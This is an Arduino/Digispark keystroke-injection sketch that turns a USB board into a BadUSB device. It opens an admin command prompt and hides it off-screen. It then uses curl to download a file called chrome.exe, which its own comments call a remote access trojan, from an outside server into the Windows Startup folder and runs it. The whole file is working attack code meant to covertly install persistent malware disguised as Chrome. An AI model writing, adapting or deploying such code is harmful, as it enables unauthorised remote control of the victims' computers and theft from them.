#include "DigiKeyboard.h"

// Define -----------------------------------------------------------------------------------------
#define KEY_DOWN 0x51
#define KEY_ENTER 0x28
#define KEY_TAB 43
// ------------------------------------------------------------------------------------------------


void setup() {
  // Set pin modes --------------------------------------------------------------------------------
  pinMode(1, OUTPUT);
  // ----------------------------------------------------------------------------------------------
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(100);
  digitalWrite(1, HIGH); // Turn the LED on
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Open run window
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd"); // Write cmd in run input
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER,MOD_SHIFT_LEFT|MOD_CONTROL_LEFT); // Open cmd (admin mod)
  DigiKeyboard.delay(1000); // Wate for open cmd
  // Hidden cmd 
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); // Open cmd menu
  DigiKeyboard.delay(150);
  DigiKeyboard.sendKeyStroke(KEY_M); // Set move cmd 
  // Move cmd to footer ---------------------------------------------------------------------------
  for(int i =0; i < 110; i++)
    {
      DigiKeyboard.sendKeyStroke(KEY_DOWN); 
    }
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Fix cmd location
  // ----------------------------------------------------------------------------------------------
  DigiKeyboard.delay(500); // Wate for write command
  DigiKeyboard.println("cd %APPDATA%"); // Go to APPDATA directory 
  DigiKeyboard.delay(500);// Wate for write command
  DigiKeyboard.println("cd Microsoft\\Windows\\Start Menu\\Programs\\Startup"); // go to startup folder
  DigiKeyboard.delay(600); // Wate for write command
  DigiKeyboard.println("curl https://sorenshamlou.ir/media/files/chrome.exe --output chrome.exe"); // download RAT file
  DigiKeyboard.delay(60000); // Wate for download RAT file
  DigiKeyboard.println("chrome.exe"); // Run RAT file
  DigiKeyboard.delay(1500); // Wate for run RAT app
  DigiKeyboard.println("exit"); // Exite cmd
  DigiKeyboard.delay(100);
}

void loop()
{
    digitalWrite(1, LOW);  // Turn the LED off
    delay(100);            // Wait for 1/10 second
    digitalWrite(1, HIGH); // Turn the LED on
    delay(100);
}
